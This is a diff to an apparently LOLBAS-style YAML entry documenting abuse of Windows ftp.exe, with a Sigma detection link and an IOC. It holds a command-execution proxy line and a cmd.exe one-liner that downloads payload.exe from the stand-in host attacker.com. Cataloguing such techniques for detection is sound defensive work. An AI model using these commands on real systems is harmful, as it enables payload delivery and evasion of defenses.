@@ -1,16 +1,18 @@
 ---
 Name: Ftp.exe
 Description: A binary designed for connecting to FTP servers
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-12-10
 Commands:
-  - Command: echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
+  - Command: echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
     Description: Executes the commands you put inside the text file.
     Usecase: Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand
     Category: Execute
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: CMD
   - Command: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
     Description: Download
     Usecase: Spawn new process using ftp.exe. Ftp.exe downloads the binary.
@@ -21,8 +23,6 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\ftp.exe
   - Path: C:\Windows\SysWOW64\ftp.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ftp.yml
   - IOC: cmd /c as child process of ftp.exe
